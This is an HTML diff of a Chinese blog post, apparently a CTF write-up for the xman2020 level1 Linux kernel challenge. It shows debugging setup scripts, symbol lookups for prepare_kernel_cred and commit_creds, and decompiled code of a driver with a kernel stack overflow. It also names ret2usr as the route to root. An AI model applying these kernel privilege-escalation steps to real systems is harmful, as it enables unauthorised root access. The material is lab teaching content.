+grep prepare_kernel_cred  &#x2F;proc&#x2F;kallsyms 从内核符号表中查找符号
+grep commit_creds &#x2F;proc&#x2F;kallsyms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="xman2020-level1"><a href="#xman2020-level1" class="headerlink" title="xman2020 level1"></a>xman2020 level1</h2><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-276403.htm">https://bbs.kanxue.com/thread-276403.htm</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7625?time__1311=n4+xnD0G0=G=n4Gwx05+4oiitG8FerYi4D&alichlgref=https://xuanxuanblingbling.github.io/">https://xz.aliyun.com/t/7625?time__1311=n4%2BxnD0G0%3DG%3Dn4Gwx05%2B4oiitG8FerYi4D&amp;alichlgref=https%3A%2F%2Fxuanxuanblingbling.github.io%2F</a></p>
@@ -537,1572 +222,375 @@
 <p>gdb千万不要用pwndbg插件，要用gef去插件去调试，pwndbg调试会有各种奇奇怪怪的问题</p>
 <p>本地调试的话，每次开启调试都要做一些设置比较繁琐，最好写几个批处理文件用于调试</p>
 <p>pack.sh 用于编译exp，将exp打包进文件系统中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">musl-gcc -static -O2 exp.c -o exp</span><br><span class="line">cp ./exp ./initramfs_content/home/pwn/exp</span><br><span class="line">cd ./initramfs_content</span><br><span class="line">find . | cpio -o --format=newc &gt; ../initramfs.cpio</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">musl-gcc -static -O2 exp.c -o exp
+cp .&#x2F;exp .&#x2F;initramfs_content&#x2F;home&#x2F;pwn&#x2F;exp
+cd .&#x2F;initramfs_content
+find . | cpio -o --format&#x3D;newc &gt; ..&#x2F;initramfs.cpio
+cd ..<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>startvm.sh 用于启动qemu，其中 -s参数的意思是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-s              shorthand for -gdb tcp::1234</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">-s              shorthand for -gdb tcp::1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">stty intr ^]</span><br><span class="line">cd `dirname $0`</span><br><span class="line">timeout --foreground 600 qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr&#x27; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu qemu64 2&gt;/dev/null \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
+
+stty intr ^]
+cd &#96;dirname $0&#96;
+timeout --foreground 600 qemu-system-x86_64 \
+    -m 64M \
+    -nographic \
+    -kernel bzImage \
+    -append &#39;console&#x3D;ttyS0 loglevel&#x3D;3 oops&#x3D;panic panic&#x3D;1 nokaslr&#39; \
+    -monitor &#x2F;dev&#x2F;null \
+    -initrd initramfs.cpio \
+    -smp cores&#x3D;1,threads&#x3D;1 \
+    -cpu qemu64 2&gt;&#x2F;dev&#x2F;null \
+    -s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>debug.sh 用于初始化gdb开启调试，其中baby.ko需要设置一下基地址，然后 b *(0xffffffffc0002000 + 0x24) 这个断点是题目逻辑中调用copy from user时候的地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb -q \</span><br><span class="line">-ex &quot;file vmlinux&quot; \</span><br><span class="line">-ex &quot;add-symbol-file baby.ko 0xffffffffc0002000&quot; \</span><br><span class="line">-ex &quot;add-symbol-file exp&quot; \</span><br><span class="line">-ex &quot;b *(0xffffffffc0002000 + 0x24)&quot; \</span><br><span class="line">-ex &quot;target remote :1234&quot; \</span><br><span class="line">-ex &quot;c&quot;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb -q \
+-ex &quot;file vmlinux&quot; \
+-ex &quot;add-symbol-file baby.ko 0xffffffffc0002000&quot; \
+-ex &quot;add-symbol-file exp&quot; \
+-ex &quot;b *(0xffffffffc0002000 + 0x24)&quot; \
+-ex &quot;target remote :1234&quot; \
+-ex &quot;c&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>查看模块基地址的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn # cat /proc/modules</span><br><span class="line">baby 16384 0 - Live 0xffffffffc0002000 (POE)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;home&#x2F;pwn # cat &#x2F;proc&#x2F;modules
+baby 16384 0 - Live 0xffffffffc0002000 (POE)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>题目如果没有给 vmlinux 这个文件的话, 可以用extract-vmlinux.sh这个脚本从bzimage中提取vmlinux符号</p>
 <p>使用方法，可以把这个脚本放在&#x2F;usr&#x2F;bin目录下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; ./vmlinux</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;extract-vmlinux .&#x2F;bzImage &gt; .&#x2F;vmlinux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>extract-vmlinux.sh</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Inspired from extract-ikconfig</span></span><br><span class="line"><span class="comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">check_vmlinux</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># Use readelf to check if it&#x27;s a valid ELF</span></span><br><span class="line">	<span class="comment"># <span class="doctag">TODO:</span> find a better to way to check that it&#x27;s really vmlinux</span></span><br><span class="line">	<span class="comment">#       and not just an elf</span></span><br><span class="line">	readelf -h <span class="variable">$1</span> &gt; /dev/null 2&gt;&amp;1 || <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line">	<span class="built_in">cat</span> <span class="variable">$1</span></span><br><span class="line">	<span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">try_decompress</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span></span><br><span class="line">	<span class="comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Try to find the header ($1) and decompress from here</span></span><br><span class="line">	<span class="keyword">for</span>	pos <span class="keyword">in</span> `<span class="built_in">tr</span> <span class="string">&quot;<span class="variable">$1</span>\n<span class="variable">$2</span>&quot;</span> <span class="string">&quot;\n<span class="variable">$2</span>=&quot;</span> &lt; <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | grep -abo <span class="string">&quot;^<span class="variable">$2</span>&quot;</span>`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		pos=<span class="variable">$&#123;pos%%:*&#125;</span></span><br><span class="line">		<span class="built_in">tail</span> -c+<span class="variable">$pos</span> <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | <span class="variable">$3</span> &gt; <span class="variable">$tmp</span> 2&gt; /dev/null</span><br><span class="line">		check_vmlinux <span class="variable">$tmp</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check invocation:</span></span><br><span class="line">me=<span class="variable">$&#123;0##*/&#125;</span></span><br><span class="line">img=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span>	[ <span class="variable">$#</span> -ne 1 -o ! -s <span class="string">&quot;<span class="variable">$img</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$me</span> &lt;kernel-image&gt;&quot;</span> &gt;&amp;2</span><br><span class="line">	<span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare temp files:</span></span><br><span class="line">tmp=$(<span class="built_in">mktemp</span> /tmp/vmlinux-XXX)</span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;rm -f <span class="variable">$tmp</span>&quot;</span> 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># That didn&#x27;t work, so retry after decompression.</span></span><br><span class="line">try_decompress <span class="string">&#x27;\037\213\010&#x27;</span> xy    gunzip</span><br><span class="line">try_decompress <span class="string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz</span><br><span class="line">try_decompress <span class="string">&#x27;BZh&#x27;</span>          xy    bunzip2</span><br><span class="line">try_decompress <span class="string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma</span><br><span class="line">try_decompress <span class="string">&#x27;\211\114\132&#x27;</span> xy    <span class="string">&#x27;lzop -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="string">&#x27;lz4 -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally check for uncompressed images or objects:</span></span><br><span class="line">check_vmlinux <span class="variable">$img</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bail out:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$me</span>: Cannot find vmlinux.&quot;</span> &gt;&amp;2</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
+<span class="token comment"># SPDX-License-Identifier: GPL-2.0-only</span>
+<span class="token comment"># ----------------------------------------------------------------------</span>
+<span class="token comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span>
+<span class="token comment">#</span>
+<span class="token comment"># Inspired from extract-ikconfig</span>
+<span class="token comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net></span>
+<span class="token comment">#</span>
+<span class="token comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com></span>
+<span class="token comment">#</span>
+<span class="token comment"># ----------------------------------------------------------------------</span>
+
+<span class="token function-name function">check_vmlinux</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token comment"># Use readelf to check if it's a valid ELF</span>
+	<span class="token comment"># TODO: find a better to way to check that it's really vmlinux</span>
+	<span class="token comment">#       and not just an elf</span>
+	readelf <span class="token parameter variable">-h</span> <span class="token variable">$1</span> <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">||</span> <span class="token builtin class-name">return</span> <span class="token number">1</span>
+
+	<span class="token function">cat</span> <span class="token variable">$1</span>
+	<span class="token builtin class-name">exit</span> <span class="token number">0</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function-name function">try_decompress</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token comment"># The obscure use of the "tr" filter is to work around older versions of</span>
+	<span class="token comment"># "grep" that report the byte offset of the line instead of the pattern.</span>
+
+	<span class="token comment"># Try to find the header ($1) and decompress from here</span>
+	<span class="token keyword">for</span>	<span class="token for-or-select variable">pos</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span><span class="token function">tr</span> <span class="token string">"<span class="token variable">$1</span><span class="token entity" title="\n">\n</span><span class="token variable">$2</span>"</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token variable">$2</span>="</span> <span class="token operator">&lt;</span> <span class="token string">"<span class="token variable">$img</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-abo</span> <span class="token string">"^<span class="token variable">$2</span>"</span><span class="token variable">`</span></span>
+	<span class="token keyword">do</span>
+		<span class="token assign-left variable">pos</span><span class="token operator">=</span><span class="token variable">$&#123;pos<span class="token operator">%%</span><span class="token operator">:</span>*&#125;</span>
+		<span class="token function">tail</span> -c+<span class="token variable">$pos</span> <span class="token string">"<span class="token variable">$img</span>"</span> <span class="token operator">|</span> <span class="token variable">$3</span> <span class="token operator">></span> <span class="token variable">$tmp</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span> /dev/null
+		check_vmlinux <span class="token variable">$tmp</span>
+	<span class="token keyword">done</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment"># Check invocation:</span>
+<span class="token assign-left variable">me</span><span class="token operator">=</span><span class="token variable">$&#123;0<span class="token operator">##</span>*<span class="token operator">/</span>&#125;</span>
+<span class="token assign-left variable">img</span><span class="token operator">=</span><span class="token variable">$1</span>
+<span class="token keyword">if</span>	<span class="token punctuation">[</span> <span class="token variable">$#</span> <span class="token parameter variable">-ne</span> <span class="token number">1</span> <span class="token parameter variable">-o</span> <span class="token operator">!</span> <span class="token parameter variable">-s</span> <span class="token string">"<span class="token variable">$img</span>"</span> <span class="token punctuation">]</span>
+<span class="token keyword">then</span>
+	<span class="token builtin class-name">echo</span> <span class="token string">"Usage: <span class="token variable">$me</span> &lt;kernel-image>"</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;2</span>
+	<span class="token builtin class-name">exit</span> <span class="token number">2</span>
+<span class="token keyword">fi</span>
+
+<span class="token comment"># Prepare temp files:</span>
+<span class="token assign-left variable">tmp</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp /tmp/vmlinux-XXX<span class="token variable">)</span></span>
+<span class="token builtin class-name">trap</span> <span class="token string">"rm -f <span class="token variable">$tmp</span>"</span> <span class="token number">0</span>
+
+<span class="token comment"># That didn't work, so retry after decompression.</span>
+try_decompress <span class="token string">'\037\213\010'</span> xy    gunzip
+try_decompress <span class="token string">'\3757zXZ\000'</span> abcde unxz
+try_decompress <span class="token string">'BZh'</span>          xy    bunzip2
+try_decompress <span class="token string">'\135\0\0\0'</span>   xxx   unlzma
+try_decompress <span class="token string">'\211\114\132'</span> xy    <span class="token string">'lzop -d'</span>
+try_decompress <span class="token string">'\002!L\030'</span>   xxx   <span class="token string">'lz4 -d'</span>
+try_decompress <span class="token string">'(\265/\375'</span>   xxx   unzstd
+
+<span class="token comment"># Finally check for uncompressed images or objects:</span>
+check_vmlinux <span class="token variable">$img</span>
+
+<span class="token comment"># Bail out:</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$me</span>: Cannot find vmlinux."</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>上面的脚本使用方法是，写好exp.c后运行pack把exp编译好打包进文件系统里，然后startvm启动qemu，debug.sh去连接qemu并且在 题目定义的驱动中下一个断点，然后再qemu中运行exp这个二进制文件，这时候gdb就会在题目的逻辑那断下来，就可以开始在gdb上调试了</p>
 <p>题目的逻辑是这样的</p>
 <p>init_module是一个特殊的函数名，使用insmod去把这个程序加载到内核中的时候，这个函数会被调用，作用和main函数差不多的，misc_register是注册一个字符设备，字符设备以字符为单位进行读写的操作</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">return</span> misc_register(&amp;off_120);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">init_module</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">_fentry__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">misc_register</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>off_120<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后 这个是这个字符设备名称叫baby</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data:0000000000000120</span><br><span class="line">.data:0000000000000120                               ; Segment type: Pure data</span><br><span class="line">.data:0000000000000120                               ; Segment permissions: Read/Write</span><br><span class="line">.data:0000000000000120                               _data segment align_32 public &#x27;DATA&#x27; use64</span><br><span class="line">.data:0000000000000120                               assume cs:_data</span><br><span class="line">.data:0000000000000120                               ;org 120h</span><br><span class="line">.data:0000000000000120 FF 00 00 00 00 00 00 00       off_120 dq offset unk_FF                ; DATA XREF: init_module+6↑o</span><br><span class="line">.data:0000000000000120                                                                       ; cleanup_module+6↑o</span><br><span class="line">.data:0000000000000128 7F 00 00 00 00 00 00 00       dq offset aBaby                         ; &quot;baby&quot;</span><br><span class="line">.data:0000000000000130 80 01 00 00 00 00 00 00       dq offset off_180</span><br><span class="line">.data:0000000000000138 00 00 00 00 00 00 00 00 00 00+align 80h</span><br><span class="line">.data:0000000000000180 80 02 00 00 00 00 00 00       off_180 dq offset __this_module         ; DATA XREF: .data:0000000000000130↑oxxxxxxxxxx data:0000000000000120.data:0000000000000120                               ; Segment type: Pure data.data:0000000000000120                               ; Segment permissions: Read/Write.data:0000000000000120                               _data segment align_32 public &#x27;DATA&#x27; use64.data:0000000000000120                               assume cs:_data.data:0000000000000120                               ;org 120h.data:0000000000000120 FF 00 00 00 00 00 00 00       off_120 dq offset unk_FF                ; DATA XREF: init_module+6↑o.data:0000000000000120                                                                       ; cleanup_module+6↑o.data:0000000000000128 7F 00 00 00 00 00 00 00       dq offset aBaby                         ; &quot;baby&quot;.data:0000000000000130 80 01 00 00 00 00 00 00       dq offset off_180.data:0000000000000138 00 00 00 00 00 00 00 00 00 00+align 80h.data:0000000000000180 80 02 00 00 00 00 00 00       off_180 dq offset __this_module         ; DATA XREF: .data:0000000000000130↑o__int64 __fastcall sub_0(__int64 a1, int a2)&#123;  __int64 v2; // rbp  __int64 v3; // rdx  _QWORD v5[17]; // [rsp-88h] [rbp-88h] BYREF  _fentry__();  if ( a2 != 24577 )    return 0LL;  v5[16] = v2;  return (int)copy_from_user(v5, v3, 256LL);&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">data:0000000000000120
+.data:0000000000000120                               ; Segment type: Pure data
+.data:0000000000000120                               ; Segment permissions: Read&#x2F;Write
+.data:0000000000000120                               _data segment align_32 public &#39;DATA&#39; use64
+.data:0000000000000120                               assume cs:_data
+.data:0000000000000120                               ;org 120h
+.data:0000000000000120 FF 00 00 00 00 00 00 00       off_120 dq offset unk_FF                ; DATA XREF: init_module+6↑o
+.data:0000000000000120                                                                       ; cleanup_module+6↑o
+.data:0000000000000128 7F 00 00 00 00 00 00 00       dq offset aBaby                         ; &quot;baby&quot;
+.data:0000000000000130 80 01 00 00 00 00 00 00       dq offset off_180
+.data:0000000000000138 00 00 00 00 00 00 00 00 00 00+align 80h
+.data:0000000000000180 80 02 00 00 00 00 00 00       off_180 dq offset __this_module         ; DATA XREF: .data:0000000000000130↑oxxxxxxxxxx data:0000000000000120.data:0000000000000120                               ; Segment type: Pure data.data:0000000000000120                               ; Segment permissions: Read&#x2F;Write.data:0000000000000120                               _data segment align_32 public &#39;DATA&#39; use64.data:0000000000000120                               assume cs:_data.data:0000000000000120                               ;org 120h.data:0000000000000120 FF 00 00 00 00 00 00 00       off_120 dq offset unk_FF                ; DATA XREF: init_module+6↑o.data:0000000000000120                                                                       ; cleanup_module+6↑o.data:0000000000000128 7F 00 00 00 00 00 00 00       dq offset aBaby                         ; &quot;baby&quot;.data:0000000000000130 80 01 00 00 00 00 00 00       dq offset off_180.data:0000000000000138 00 00 00 00 00 00 00 00 00 00+align 80h.data:0000000000000180 80 02 00 00 00 00 00 00       off_180 dq offset __this_module         ; DATA XREF: .data:0000000000000130↑o__int64 __fastcall sub_0(__int64 a1, int a2)&#123;  __int64 v2; &#x2F;&#x2F; rbp  __int64 v3; &#x2F;&#x2F; rdx  _QWORD v5[17]; &#x2F;&#x2F; [rsp-88h] [rbp-88h] BYREF  _fentry__();  if ( a2 !&#x3D; 24577 )    return 0LL;  v5[16] &#x3D; v2;  return (int)copy_from_user(v5, v3, 256LL);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>往下看可以发现这个字符设备的处理函数在这里</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_0(__int64 a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rbp</span><br><span class="line">  __int64 v3; // rdx</span><br><span class="line">  _QWORD v5[17]; // [rsp-88h] [rbp-88h] BYREF</span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  if ( a2 != 24577 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  v5[16] = v2;</span><br><span class="line">  return (int)copy_from_user(v5, v3, 256LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">__int64 __fastcall sub_0(__int64 a1, int a2)
+&#123;
+  __int64 v2; &#x2F;&#x2F; rbp
+  __int64 v3; &#x2F;&#x2F; rdx
+  _QWORD v5[17]; &#x2F;&#x2F; [rsp-88h] [rbp-88h] BYREF
+
+  _fentry__();
+  if ( a2 !&#x3D; 24577 )
+    return 0LL;
+  v5[16] &#x3D; v2;
+  return (int)copy_from_user(v5, v3, 256LL);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>和字符设备交互，使用 &lt;sys&#x2F;ioctl.h&gt; 中的 ioctl() 函数，查看ioctl函数的定义并且结合题目中字符设备处理函数可以发现 a1 a2 a3 正好是对应ioctl的三个参数，a2要 &#x3D;&#x3D; 24577才能往下走，然后copy_from_user的第二个参数是一个用户态的指针，所以使用ioctl的时候 第二个参数的值要 &#x3D;&#x3D; 24577 第三个参数的值是一个指针</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extern int __ioctl_time64 (int __fd, unsigned long int __request, ...) __THROW;</span><br><span class="line">#  define ioctl __ioctl_time64</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">extern int __ioctl_time64 (int __fd, unsigned long int __request, ...) __THROW;
+#  define ioctl __ioctl_time64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>然后copy from user这里存在一个内核栈溢出，题目没有开启smep smap 以及kaslr的保护，可以使用ret2usr</p>
 <p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2usr/#:~:text=%E9%80%9A%E5%B8%B8%20CTF%20%E4%B8%AD%E7%9A%84%20ret2usr%20%E8%BF%98%E6%98%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%20commit_creds%20%28prepare_kernel_cred,%28NULL%29%29%20%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83%E4%B8%BA%E4%B8%BB%E8%A6%81%E7%9A%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%EF%BC%8C%E4%B8%8D%E8%BF%87%E7%9B%B8%E6%AF%94%E8%B5%B7%E6%9E%84%E9%80%A0%E5%86%97%E9%95%BF%E7%9A%84%20ROP%20chain%EF%BC%8Cret2usr%20%E5%8F%AA%E9%9C%80%E6%88%91%E4%BB%AC%E8%A6%81%E6%8F%90%E5%89%8D%E5%9C%A8%E7%94%A8%E6%88%B7%E6%80%81%E7%A8%8B%E5%BA%8F%E6%9E%84%E9%80%A0%E5%A5%BD%E5%AF%B9%E5%BA%94%E7%9A%84%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E3%80%81%E8%8E%B7%E5%8F%96%E7%9B%B8%E5%BA%94%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E5%90%8E%E7%9B%B4%E6%8E%A5%20ret%20%E5%9B%9E%E5%88%B0%E7%94%A8%E6%88%B7%E7%A9%BA%E9%97%B4%E6%89%A7%E8%A1%8C%E5%8D%B3%E5%8F%AF%E3%80%82">https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2usr/#:~:text=%E9%80%9A%E5%B8%B8%20CTF%20%E4%B8%AD%E7%9A%84%20ret2usr%20%E8%BF%98%E6%98%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%20commit_creds%20%28prepare_kernel_cred,%28NULL%29%29%20%E8%BF%9B%E8%A1%8C%E6